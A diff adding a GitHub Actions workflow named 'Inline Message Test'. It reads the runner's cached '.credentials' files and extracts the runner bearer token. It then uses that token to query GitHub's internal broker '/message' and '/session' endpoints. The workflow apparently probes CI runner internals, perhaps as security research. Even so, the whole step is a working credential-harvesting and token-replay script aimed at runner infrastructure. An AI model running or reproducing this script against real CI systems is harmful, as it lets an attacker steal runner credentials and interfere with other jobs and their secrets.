@@ -1,0 +1,26 @@
+name: Inline Message Test
+on: workflow_dispatch
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Read creds and call message inline
+        run: |
+          CREDS="/home/runner/actions-runner/cached/*/.credentials"
+          for f in $CREDS; do
+            TOKEN=$(python3 -c "import json; print(json.load(open('$f'))['Data']['token'])")
+            echo "Token captured (length ${#TOKEN})"
+            
+            echo "=== /message from WITHIN active runner ==="
+            RESP=$(curl -s -w "\nHTTP:%{http_code}" --max-time 10 \
+              -H "Authorization: Bearer $TOKEN" \
+              "https://broker.actions.githubusercontent.com/message")
+            echo "$RESP" | tail -5
+            
+            echo ""
+            echo "=== /session from within ==="
+            curl -s -w "\nHTTP:%{http_code}" --max-time 3 \
+              -H "Authorization: Bearer $TOKEN" \
+              "https://broker.actions.githubusercontent.com/session" | head -3
+            break
+          done
